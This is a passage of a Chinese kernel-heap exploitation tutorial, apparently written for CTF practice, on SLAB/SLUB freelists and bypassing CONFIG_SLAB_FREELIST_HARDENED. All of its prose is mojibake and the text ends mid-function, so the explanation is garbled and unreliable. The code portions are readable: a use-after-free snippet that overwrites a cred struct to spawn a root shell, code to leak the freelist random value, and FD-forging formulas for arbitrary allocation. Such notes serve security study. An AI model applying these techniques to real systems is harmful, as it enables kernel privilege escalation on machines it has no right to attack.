`\n\n![image-20220314120914190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png)\n\né‚£ä¹ˆæˆ‘ä»¬çš„`kmalloc-32`çš„`freelist`å³ä¸º`0xffff88800f380000+0x2d260`ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é‡Šæ”¾çš„chunkç¡®å®æ˜¯æ”¾å…¥äº†CPU3ä¸Šå¯¹åº”çš„`kmalloc-32`çš„`freelist`ä¸­\n\n![image-20220316202605604](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png)\n\nå½“ç„¶ï¼Œåœ¨SLUBåˆ†é…ä¸‹ï¼Œç”±äºFDæŒ‡é’ˆçš„å­˜åœ¨ï¼Œfreelistæ›´åƒæ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œfreelistä¸­çš„ç¬¬ä¸€ä¸ªchunkä½œä¸ºé“¾è¡¨å¤´ä¾æ®FDæŒ‡é’ˆä¸²è”èµ·æ•´ä¸ªfreelist\n\n\n\n#### ä»…SLABä¸‹\n\nåŒæ ·ä¹Ÿå…·å¤‡å¤šç»´æˆ–è€…ä¸€ç»´çš„`kmalloc_caches`\n\n`kmalloc_caches[0][1]~kmalloc_caches[0][2]`ä¸º`kmalloc-96~kmalloc-192`\n\n`kmalloc_caches[0][3]~kmalloc_caches[0][4]`ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰\n\n`kmalloc_caches[0][5]~kmalloc_caches[0][22]`ä¸º`kmalloc-32~kmalloc-4M`\n\nåŒç†å¯¹åº”çš„å¤šç»´å’Œä¸€ç»´ä¹Ÿæ˜¯ç±»ä¼¼çš„\n\n![image-20220313160119681](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png)\n\nåˆ†é…æ–¹å¼ä¸Šæœ‰ç‚¹ä¸åŒï¼Œå…·ä½“çš„æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ï¼š\n\n[(41æ¡æ¶ˆæ¯) slabå†…å­˜ç®¡ç†æ–¹æ¡ˆå­¦ä¹ è®°å½•_liuhangtiantçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/liuhangtiant/category_7929217.html)\n\nè¿™ç§æƒ…å†µä¸‹çš„Chunkå…¶å®ä¸å¸¦FDæŒ‡é’ˆçš„ï¼Œæ‰€ä»¥åªç”¨äº`freelist`ä¸Šå³å¯ï¼Œç®€å•æ¥è¯´ï¼Œslabçš„`freelist`æ›´åƒæ˜¯ä¸€ä¸ªæ•°ç»„è¿›è¡Œç´¢å¼•ã€‚\n\n- é¦–å…ˆæ‰¾åˆ°ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯`CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.avail`å¯¹åº”çš„å€¼ï¼Œä»¥`CPU3`å’Œ`kmalloc-1024`ä¸ºä¾‹ï¼š\n\n![image-20220316203909895](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png)\n\n- ç„¶åå†æ‰¾åˆ°`freelist`çš„åœ°å€ï¼Œå³`CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry`\n\n![image-20220316204056370](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png)\n\nå…¶å®é€šè¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ`entry`å…¶å®ä¹Ÿå°±æ˜¯`cpu_cache+0x10`è€Œå·²ã€‚é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¾—åˆ°freelistçš„åœ°å€ï¼Œå°±å°†å…¶å½“ä½œä¸€ä¸ªæ•°ç»„è¿›è¡Œå–ç”¨ï¼Œæ¯”å¦‚è¿™é‡Œçš„ç´¢å¼•idxä¸º2ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹ä¸€æ¬¡åˆ†é…å°±ä¼šå–freelist[2]è¿™ä¸ªobjï¼Œä½†æ˜¯è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè¿™ä¸ªç´¢å¼•æ˜¯ä»1å¼€å§‹çš„ï¼Œå¦‚ä¸‹ï¼š\n\n![image-20220316204603914](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png)\n\nä¸‹ä¸€æ¬¡åˆ†é…å–åˆ°`chunk`æ˜¯`0xffff88800d538400`è€Œé`0xffff88800d538c00`ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªç´¢å¼•idxæ›´åƒæ˜¯ä¸€ä¸ªè®¡æ•°ï¼Œè¡¨ç¤ºè¿˜å‰©2ä¸ªchunkå¯ç”¨ï¼Œä»å°¾éƒ¨å¼€å§‹å–ç”¨\n\n##### ğŸ”ºæ³¨ï¼š\n\nå½“ç„¶ä»¥ä¸Šçš„æƒ…å†µå®é™…æ“ä½œèµ·æ¥å¤ªéº»çƒ¦ï¼Œè¿˜ä¸å¦‚å†™ä¸ªå°æ’ä»¶ï¼Œè‡ªå·±è¿›è¡Œè®¡ç®—\n\nå‚è€ƒè‡ªå·±å†™çš„å°å·¥å…·ï¼š[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\n###### SLABï¼š\n\n![image-20220316204859800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png)\n\n###### SLUBï¼š\n\nè¿™ä¸ªå¸¦ä¸Šäº†è®¡ç®—swabå’Œrandomå€¼å¾—åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å¼€å¯äº†hardençš„æƒ…å†µä¸‹ï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰FDåç§»ä½ç½®æ”¹å˜çš„æƒ…å†µï¼Œä¸è¿‡éœ€è¦è®¾ç½®\n\n![image-20220316205100876](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png)\n\n\n\n### ä¿®æ”¹credç»“æ„ä½“\n\nè¿™ä¸ªå°±ä¸ç”¨è¯´å¤ªå¤šï¼Œé€šå¸¸æ˜¯0xa8å¤§å°çš„ç»“æ„ä½“ï¼Œæ¸…ç©ºå‰28å­—èŠ‚\n\n```c\nchar credBuf[0xa8] = {0};\naddFun(fd,0xa8,credBuf);\nfreeFun(fd,0);\n\nidFork = fork();\nif(idFork == 0){\n    //get into 28*0 to set uid and gid 0\n    editFun(fd,0,28,credBuf);\n    if(getuid() == 0){\n        printf(\"[*]welcome root:\\n\");\n        system(\"/bin/sh\");\n        return 0;\n    }\n}\nelse if(idFork < 0){\n    printf(\"[*]fork fail\\n\");\n}\nelse{\n    wait(NULL);\n}\n```\n\n### ä¿®æ”¹FDç”³è¯·\n\n#### (1)HARDENEDä¿æŠ¤\n\nä¸è¿‡ä»4.14çš„å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼Œå°±å­˜åœ¨`freelist_ptr`åŠ å¯†äº†ï¼Œä¸è¿‡éœ€è¦åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™åŠ å…¥`CONFIG_SLAB_FREELIST_HARDENED`é€‰é¡¹æ¥å¯ç”¨ï¼Œå¹¶ä¸”åŠ å¯†å½¢å¼åœ¨ä¸åŒç‰ˆæœ¬ä¸å¤ªä¸€æ ·ã€‚\n\n```c\n//v4.14\nstatic inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,\n\t\t\t\t unsigned long ptr_addr)\n{\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\treturn (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);\n#else\n\treturn ptr;\n#endif\n}\n\n\n//v5.16\nstatic inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,\n\t\t\t\t unsigned long ptr_addr)\n{\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\t/*\n\t * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.\n\t * Normally, this doesn't cause any issues, as both set_freepointer()\n\t * and get_freepointer() are called with a pointer with the same tag.\n\t * However, there are some issues with CONFIG_SLUB_DEBUG code. For\n\t * example, when __free_slub() iterates over objects in a cache, it\n\t * passes untagged pointers to check_object(). check_object() in turns\n\t * calls get_freepointer() with an untagged pointer, which causes the\n\t * freepointer to be restored incorrectly.\n\t */\n\treturn (void *)((unsigned long)ptr ^ s->random ^\n\t\t\tswab((unsigned long)kasan_reset_tag((void *)ptr_addr)));\n#else\n\treturn ptr;\n#endif\n}\n```\n\nè¿™é‡Œçš„`ptr`å³å½“å‰é‡Šæ”¾çš„chunkåœ°å€ï¼Œptr_addrä¸ºæŒ‡å‘ä¸‹ä¸€ä¸ªfree_chunkçš„åœ°å€ï¼Œæ‰€ä»¥ä¸­é—´ç›¸å½“äºæœ‰ä¸€ä¸ªrandomå€¼ä¸çŸ¥é“ã€‚è¿™ä¸ªå€¼åœ¨`linux/slub_def.h`ä¸­è¢«å®šä¹‰\n\n```c\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tunsigned long random;\n#endif\n```\n\nå¹¶ä¸”åœ¨`mm/slub.c`ä¸­çš„`kmem_cache_open`å‡½æ•°ä¸­è¢«èµ‹å€¼\n\n```C\nstatic int kmem_cache_open(struct kmem_cache *s, slab_flags_t flags)\n{\n\ts->flags = kmem_cache_flags(s->size, flags, s->name, s->ctor);\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\ts->random = get_random_long();\n#endif\n```\n\nå‚è€ƒ[Slub Freelist Hardened (rtfingc.github.io)](https://rtfingc.github.io/slub-freelist-hardened)\n\nè¿™é‡Œéœ€è¦æˆ‘ä»¬è·å¾—randomçš„å€¼ï¼Œè¿™ä¸ªå€¼ä¿å­˜åœ¨å¯¹äºsizeçš„kmem_cacheä¸­ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰åœ¨`/linux/slub_def.h`ä¸­å¦‚ä¸‹\n\n```c\n//v4.17\nstruct kmem_cache {\n\tstruct kmem_cache_cpu __percpu *cpu_slab;\n\t/* Used for retriving partial slabs etc */\n\tslab_flags_t flags;\n\tunsigned long min_partial;\n\tunsigned int size;\t/* The size of an object including meta data */\n\tunsigned int object_size;/* The size of an object without meta data */\n\tunsigned int offset;\t/* Free pointer offset. */\n#ifdef CONFIG_SLUB_CPU_PARTIAL\n\t/* Number of per cpu partial objects to keep around */\n\tunsigned int cpu_partial;\n#endif\n\tstruct kmem_cache_order_objects oo;\n\n\t/* Allocation and freeing of slabs */\n\tstruct kmem_cache_order_objects max;\n\tstruct kmem_cache_order_objects min;\n\tgfp_t allocflags;\t/* gfp flags to use on each alloc */\n\tint refcount;\t\t/* Refcount for slab cache destroy */\n\tvoid (*ctor)(void *);\n\tunsigned int inuse;\t\t/* Offset to metadata */\n\tunsigned int align;\t\t/* Alignment */\n\tunsigned int reserved;\t\t/* Reserved bytes at the end of slabs */\n\tunsigned int red_left_pad;\t/* Left redzone padding size */\n\tconst char *name;\t/* Name (only for display!) */\n\tstruct list_head list;\t/* List of slab caches */\n#ifdef CONFIG_SYSFS\n\tstruct kobject kobj;\t/* For sysfs */\n\tstruct work_struct kobj_remove_work;\n#endif\n#ifdef CONFIG_MEMCG\n\tstruct memcg_cache_params memcg_params;\n\t/* for propagation, maximum size of a stored attr */\n\tunsigned int max_attr_size;\n#ifdef CONFIG_SYSFS\n\tstruct kset *memcg_kset;\n#endif\n#endif\n\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tunsigned long random;\n#endif\n\n#ifdef CONFIG_NUMA\n\t/*\n\t * Defragmentation by allocating from a remote node.\n\t */\n\tunsigned int remote_node_defrag_ratio;\n#endif\n\n#ifdef CONFIG_SLAB_FREELIST_RANDOM\n\tunsigned int *random_seq;\n#endif\n\n#ifdef CONFIG_KASAN\n\tstruct kasan_cache kasan_info;\n#endif\n\n\tunsigned int useroffset;\t/* Usercopy region offset */\n\tunsigned int usersize;\t\t/* Usercopy region size */\n\n\tstruct kmem_cache_node *node[MAX_NUMNODES];\n};\n```\n\nå¹¶ä¸”ä¸åŒsizeçš„kmem_cacheå¯¹åº”çš„randomä¸åŒã€‚\n\nåœ¨æœ‰DEBUGä¿¡æ¯çš„å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å°è¯•å¯»æ‰¾0x10å¤§å°çš„kmem_cacheæ¯”å¦‚æˆ‘ä»¬å¯»æ‰¾0x10å¤§å°çš„å°±éœ€è¦åœ¨ä¿å­˜æ‰€æœ‰kmem_cacheçš„å…¨å±€å˜é‡ç»“æ„kmalloc_cachesä¸­å¯»æ‰¾ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¥½åƒå¾ˆå¤šæ—¶å€™ä¸æ˜¯æŒ‰ç…§é¡ºåºæ¥æ’å¸ƒçš„ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾kmalloc-16ï¼Œä½†æ˜¯è¿™é‡Œå®ƒçš„ç´¢å¼•ä¸º4ï¼Œè€Œä¸æ˜¯2ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚\n\n![image-20220116152127879](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png)\n\nå¦å¤–kmalloc_caches[0]å¹¶ä¸æ˜¯ä¸€ä¸ªkmem_cacheç»“æ„çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¶ä»–ç±»å‹ï¼Œæš‚æ—¶ä¸çŸ¥é“ç”¨æ¥å¹²å•¥ã€‚\n\n![image-20220116152404345](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png)\n\né‚£ä¹ˆå›åˆ°æ­£é¢˜ï¼Œå…ˆå¯»æ‰¾ä¸‹randomï¼Œè¿™ä¸ªå°±æ˜¯0x10å¤§å°çš„kmem_cacheä¸­ä¿å­˜çš„randomå€¼äº†ã€‚\n\n![image-20220116152450367](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png)\n\né‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°randomå€¼å°±å¯ä»¥ç®—å‡ºä¸‹ä¸€ä¸ªchunkåœ¨å“ªé‡Œäº†\n\n![image-20220116152702584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png)\n\nä½†æ˜¯é€šå¸¸æ„ä¹‰ä¸Šå¦‚æœå¼€å¯äº†è¿™ä¸ªä¿æŠ¤ï¼Œæˆ‘ä»¬æ˜¯å¾—ä¸åˆ°å †åœ°å€çš„ï¼Œæœ€å¤šå¾—åˆ°ä¿æŠ¤ä¹‹åçš„fdçš„å€¼ï¼Œæ²¡åŠæ³•ç®—å‡ºæ¥randomçš„å€¼ï¼Œä½†æ˜¯ç”±äºæ˜¯å¼‚æˆ–äº†å½“å‰å †åœ°å€ptrå’Œå †åœ°å€+size(ptr_addr)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹sizeåšæ–‡ç« ï¼Œè¿™æ ·å¯ä»¥æ‰¾å‡ºä¸€äº›è§„å¾‹ã€‚\n\nå‚è€ƒ[slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/259280#h3-15)\n\n##### ğŸ”ºæ³¨ï¼š\n\nåœ¨è¯¥å†…æ ¸ä¸‹çš„åŒä¸€ä¸ªsizeçš„kmem_cacheçš„randomå€¼ä¸ç®¡å¯åŠ¨å¤šå°‘æ¬¡éƒ½æ˜¯å›ºå®šçš„ï¼Œæ— è®ºæœ‰æ²¡æœ‰å¼€å¯KASLRã€‚ï¼ˆè‡³å°‘æˆ‘åœ¨æœ¬åœ°æµ‹çš„æ—¶å€™æ˜¯å¦‚æ­¤çš„ï¼‰\n\n###### æœªå¼€å¯KASLR\n\n![image-20220118124309671](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png)\n\n###### å¼€å¯KASLR\n\n![image-20220118124331545](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png)\n\nå¯ä»¥çœ‹åˆ°éƒ½æ˜¯ä¸€è‡´çš„ã€‚\n\nä½†æ˜¯æ”¾åˆ°é¢˜ç›®ä¸­å°±ä¸å¤ªç¡®å®šäº†ï¼Œå°±æ˜¯å°†é¢˜ç›®åœ¨æœ¬åœ°è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼å’Œé¢˜ç›®åœ¨è¿œç¨‹è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ä¸€æ ·çš„å‘¢ï¼Œä¹‹å‰çš„è¥¿æ¹–çš„easy_kernelé¢˜ä¸­è²Œä¼¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰å®é™…æµ‹è¯•ï¼Œå› ä¸ºè¿˜æ²¡ç¢°åˆ°..ä¸‹å›æ¢ä¸ªæœºå™¨æµ‹è¯•ä¸‹ã€‚æˆ–è€…è¯´å’Œqemuè¿˜æ˜¯ç¯å¢ƒcpuéƒ½æœ‰å…³ç³»å—ï¼ŒæœŸå¾…å¤§ä½¬å›ç­”ã€‚\n\nè€Œä¸”åœ¨åé¢çš„**æ–°ç‰ˆçš„HARDENED**ä¸­ä¹Ÿæœ‰æåˆ°ï¼ŒåŠ å…¥swabè¿ç®—ä¹‹åï¼Œè²Œä¼¼ä¼šå¯¹randomå€¼å†åšä¸€ä¸ªä½2ä¸ªå­—èŠ‚çš„å¤„ç†ï¼Œè¿™ä¸ªæ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Œè¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªæ‡‚ã€‚\n\n##### â‘ 0x8ä¸ºä¾‹\n\n0x10å¯¹é½çš„å †å—å…¶fdå‡ä¸€æ ·ï¼Œå–å…¶fdç›´æ¥å¼‚æˆ–0x8å³å¯å¾—åˆ°kmalloc-8çš„randomå€¼\n\n![image-20220116170303600](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png)\n\nåŸå› å¦‚ä¸‹ï¼Œ0x10å¯¹é½çš„å †å—å¼‚æˆ–å…¶å€¼+0x8å¹¶ä¸ä¼šé€ æˆè¿›ä½ï¼Œæ‰€ä»¥å¼‚æˆ–å¾—åˆ°çš„å€¼éƒ½æ˜¯ä¸€æ ·çš„\n\n![image-20220116170714710](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png)\n\n##### â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰\n\nè¿™ç§ç±»å‹çš„å…¶fdå’Œrandomå€¼ä¸€èˆ¬å·®åŠä¸ªå­—èŠ‚ï¼Œå¤§ä¸äº†ç›´æ¥çˆ†ç ´ï¼Œ1/16çš„æ¦‚ç‡\n\n![image-20220116175038466](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png)\n\nå¹¶ä¸”è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œåœ¨0x10çš„æƒ…å†µä¸‹ä¹Ÿä¼šæœ‰é‡å¤çš„éƒ¨åˆ†ï¼ŒåŒæ ·çš„ï¼Œè¯¥é‡å¤çš„éƒ¨åˆ†å¼‚æˆ–0x10ä¹Ÿä¼šæ˜¯randomå€¼\n\n![image-20220116175228263](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png)\n\nå…·ä½“çš„è¿˜æ˜¯è‡ªå·±æ‘¸ç´¢æˆ–è€…çœ‹ä¸€åªç‹—å¸ˆå‚…çš„ï¼š[slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/259280#h3-16)\n\n##### æ³„éœ²random\n\nä»¥ä¸‹æ³„éœ²Randomæ ·ä¾‹ä¹Ÿæ˜¯å‚ç…§ä¸€åªç‹—å¸ˆå‚…çš„\n\n```c\nAdd(0, 0x100);\nAdd(1, 0x100);\nAdd(2, 0x100);\n\nShow(0, &FD1, 8);\nShow(1, &FD2, 8);\nShow(2, &FD3, 8);\n\nsize_t random;\nif(FD1==FD3)\n    random = FD1^0x100;\nelse\n    random = FD2^0x100;\n```\n\n##### è·å¾—å †åœ°å€ä»»æ„å†™\n\nä½†æ˜¯è·å¾—å †åœ°å€ä¸å¤ªå¥½æ•´ï¼Œéœ€è¦æ‰¾åˆ°freelistçš„æœ€åä¸€ä¸ªå †å—last_chunkï¼Œç„¶åå…¶fdå¼‚æˆ–randomå³å¯å¾—åˆ°è¯¥å †å—çš„åœ°å€ï¼Œè·å¾—å †å—åœ°å€åï¼Œç›´æ¥é‡Šæ”¾è¯¥å †å—last_chunkï¼Œç„¶åé€šè¿‡ä¹‹å‰ä¸€ä¸ªå †å—pre_chunkæº¢å‡ºæˆ–è€…UAFï¼ŒæŒ‰ç…§å¼‚æˆ–è§„åˆ™ä¿®æ”¹last_chunkçš„fdï¼Œå°±èƒ½å®ç°ä»»æ„ç”³è¯·äº†ã€‚\n\nä»¥8192å¤§å°ä¸ºä¾‹ï¼Œç”³è¯·åˆ°æœ€åä¸€ä¸ªchunkæ—¶é‡Šæ”¾ï¼Œç„¶åå†ç”³è¯·å°±èƒ½ç”³è¯·å›æ¥äº†ã€‚\n\n![image-20220116181547997](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png)\n\næ³¨æ„è·å–å †åœ°å€çš„æ—¶å€™ï¼Œç”±äºä¸åŒsizeçš„kmem_cacheçš„æœ€å¤§freelistæ•°é‡å·®å¼‚è¾ƒå¤§ï¼Œsizeè¶Šå¤§çš„å…¶freelisté“¾è¡¨ä¸ªæ•°è¶Šå°‘ï¼Œè¶Šå®¹æ˜“ç”³è¯·åˆ°æœ€åä¸€ä¸ªã€‚\n\n![image-20220116174436185](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png)\n\n#### (2)HARDENEDæ–°ç‰ˆæ”¹åŠ¨\n\n##### kasan_reset_tag\n\nä»v5.0å¼€å§‹ï¼ŒåŠ äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿\n\n```c\nkasan_reset_tag((void *)ptr_addr));\n```\n\nè¿™ä¸ªä¸çŸ¥é“ç”¨æ¥å¹²å•¥çš„ï¼Œæœ‰ç‚¹è’™åœˆ\n\n```\n//linux/kasan.h\nstatic inline void *kasan_reset_tag(const void *addr)\n{\n\treturn (void *)addr;\n}\n```\n\n\n\n##### swab\n\nä»v5.6.4å¼€å§‹ï¼ŒåˆåŠ äº†ä¸€ä¸ªè¿ç®—\n\n```c\nswab(kasan_reset_tag((void *)ptr_addr)));\n```\n\næœ¬è´¨ä¸Šæ˜¯å¤§å°ç«¯äº’æ¢ï¼Œæ¯”å¦‚\n\n```c\nint before = 0xaabbccdd;\nint after = swab(before);\nafter == 0xddccbbaa;\n```\n\nè¿™ä¸ªç›´æ¥è§£ï¼Œå‚ç…§å“ªä¸ªå¸ˆå‚…çš„æ¥ç€ï¼Œå¿˜è®°äº†.....\n\n```c\n#define __u64 u_int64_t\n#define swab64(x) ((__u64)((((__u64)(x) & (__u64)0x00000000000000ffULL) << 56) | \\\n        (((__u64)(x) & (__u64)0x000000000000ff00ULL) << 40) | \\\n        (((__u64)(x) & (__u64)0x0000000000ff0000ULL) << 24) | \\\n        (((__u64)(x) & (__u64)0x00000000ff000000ULL) << 8)  | \\\n        (((__u64)(x) & (__u64)0x000000ff00000000ULL) >> 8)  | \\\n        (((__u64)(x) & (__u64)0x0000ff0000000000ULL) >> 24) | \\\n        (((__u64)(x) & (__u64)0x00ff000000000000ULL) >> 40) | \\\n        (((__u64)(x) & (__u64)0xff00000000000000ULL) >> 56)))\n```\n\nç„¶ååˆä¸çŸ¥é“ä»å“ªä¸ªç‰ˆæœ¬å¼€å§‹ï¼ŒFDçš„å­˜æ”¾ä½ç½®å‘ç”Ÿæ”¹å˜ï¼Œæ”¾åœ¨äº†chunk_addr+(size/2)çš„ä½ç½®ä¸Šï¼Œä»¥0x80å¤§å°çš„chunkä¸ºä¾‹å­(åæ­£v5.0æ²¡æœ‰ï¼Œv5.7æœ‰)\n\n![image-20220117105059115](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png)\n\næ­¤å¤–è®¡ç®—æ–¹å¼ä¹Ÿæœ‰ç‚¹å˜åŒ–ï¼Œptr_addrä¸å†æ˜¯å½“å‰chunkçš„åœ°å€ï¼Œè€Œæ˜¯FDçš„åœ°å€ï¼ŒåŒæ—¶è¿˜æ˜¯ä¼šä¸ä¸Šé¢çš„è¿ç®—åšä¸€ä¸ªç®€å•çš„åˆå¹¶:\n\n```c\nFD_addr == chunk_addr + size/2\nFD_value == random ^ swab(FD_addr) ^ next_chunk_addr\n```\n\næ‰€ä»¥å½“æˆ‘ä»¬æœ¬åœ°æŠŠrandomå€¼æµ‹å‡ºæ¥ä¹‹åï¼Œå†ä¾æ®freelistçš„æœ€åä¸€ä¸ªç›´æ¥æ”¹next_addrç„¶åå¥—å…¥ä¸Šè¿°å…¬å¼ï¼Œè·å¾—FDå€¼ï¼Œå°†FDå€¼å†™å…¥å³å¯å®Œæˆä¸Šè¿°ä»»æ„å †å—ç”³è¯·ã€‚ï¼ˆä½†æ˜¯è¿œç¨‹è¿˜æ²¡æœ‰è¯•è¿‡ï¼Œæƒ³æ¥ä¾æ®æœ€è¿‘çš„easy_kernelä¸­æµ‹å‡ºæ¥çš„æƒ…å†µåº”è¯¥æ˜¯randomå€¼ä¹Ÿæ˜¯ä¸å˜çš„ï¼‰\n\nåŒæ ·çš„å½“ä½äºfreelistçš„æœ€åä¸€ä¸ªchunkæ—¶ï¼Œnext_chunk_addr = 0ï¼Œä¸Šè¿°å…¬å¼å°±å˜æˆå¦‚ä¸‹\n\n```c\nFD_addr == chunk_addr + size/2\nFD_value == random ^ swab(FD_addr)\n```\n\nè¿›è€Œå¯ä»¥æµ‹å‡ºFD_addrï¼Œå¾—åˆ°chunkçš„åœ°å€ã€‚å½“ç„¶ï¼Œå‰ææ˜¯å»ºç«‹åœ¨è¿œç¨‹çš„randomå€¼ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚\n\nå¦‚æœè¿œç¨‹çš„randomå€¼ä¼šå‘ç”Ÿæ”¹å˜çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥å°†å½“å‰FD_valueå¼‚æˆ–éœ€è¦åŠ«æŒçš„fake_chunk_addrï¼Œé‚£ä¹ˆä¸€ç›´å°†freelistç”³è¯·å®Œï¼Œä¹‹åå†æ¥ç€ç”³è¯·å°±èƒ½å¾—åˆ°fake_chunk_addrã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿ç»­çš„ä¸¤ä¸ªFD_valueä¸­é—´4ä¸ªå­—èŠ‚æ˜¯å¦å‘ç”Ÿæ”¹å˜æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ”¹å˜äº†ï¼Œé‚£ä¹ˆä»£è¡¨freelistå³å°†ç»“æŸï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¿®æ”¹äº†ã€‚ä¸è¿‡ä¿®æ”¹ä¹‹åï¼Œè¯¥sizeçš„`kmem_cache`çš„freelisté“¾è¡¨å°±ä¼šæŸåï¼Œè¦ä¹ˆé‡æ–°ä¿®å¤ï¼Œè¦ä¹ˆå°±ç”³è¯·å…¶ä»–sizeçš„`kmem_cache`ã€‚\n\nä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœå¼€äº†ä¸‹é¢çš„`RANDOM`ä¿æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æµ‹å‡ºæ¥çš„randomå€¼å…¶å®å°±ä¸ä¸€å®šå‡†ç¡®äº†ï¼Œå› ä¸ºfreelistä¸­çš„chunkåœ°å€ä¸æ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬ç”¨è¿ç»­çš„åœ°å€æ¥æµ‹åŠ¿å¿…å¯¼è‡´æµ‹å‡ºæ¥çš„randomå€¼çš„ä½2ä¸ªå­—èŠ‚ä¸åŒï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”³è¯·åˆ°freelistçš„æœ€åä¸€ä¸ªchunkï¼Œå–å¾—å…¶FDå€¼çš„ä½2ä¸ªå­—èŠ‚å’Œæˆ‘ä»¬ä¹‹å‰æµ‹å‡ºæ¥çš„randomä¸€åˆå¹¶å°±æ˜¯æœ€ç»ˆçš„randomå€¼äº†ã€‚ä¸è¿‡è¿™ä¸ªæ€ä¹ˆåˆ¤æ–­æ˜¯freelistçš„æœ€åä¸€ä¸ªchunkä¹Ÿæœ‰ç‚¹é—®é¢˜...\n\n\n\n##### double_free\n\nåœ¨å¼€å¯äº†HARDENEDè¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºFDæŒ‡é’ˆä¼šæ·»åŠ ä¸€ä¸ªæ£€æµ‹\n\n```c\n//mm/slub.c\nstatic inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)\n{\n\tunsigned long freeptr_addr = (unsigned long)object + s->offset;\n\n#ifdef CONFIG_SLAB_FREELIST_HARDENED\n\tBUG_ON(object == fp); /* naive detection of double free or corruption */\n#endif\n\n\t*(void **)freeptr_addr = freelist_ptr(s, fp, 